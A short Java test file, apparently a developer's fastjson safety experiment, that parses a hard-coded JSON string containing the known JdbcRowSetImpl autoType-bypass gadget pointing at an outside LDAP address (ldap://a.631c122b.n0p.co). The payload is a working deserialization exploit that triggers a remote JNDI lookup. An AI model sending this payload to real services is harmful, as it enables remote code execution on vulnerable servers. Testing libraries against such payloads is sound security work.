package com.book.developtest.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;

/**
 * @author: hj
 * @date: 2021-04-13 13:53
 * @description:
 **/

public class FastJsonSafetyTest {
    private static String str = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://a.631c122b.n0p.co\",\"autoCommit\":true}}";

    public static void main(String[] args) {
//        ParserConfig config = ParserConfig.getGlobalInstance();
//        boolean autoTypeSupport = config.isAutoTypeSupport();
//        System.out.println(autoTypeSupport);//false
//
//        Model model = new Model();
//        model.setId(1);
//        model.setName("vic");
////获得的结果为{"@type":"pers.vic.test.json.fastjson.Model","id":1,"name":"vic"}
//        String json  = JSON.toJSONString(model, SerializerFeature.WriteClassName);
//        System.out.println(json);
////反序列换报错:autoType is not support. pers.vic.test.json.fastjson.Model
//        JSON.parse(json);


        JSONObject obj = JSON.parseObject(str);



    }
}
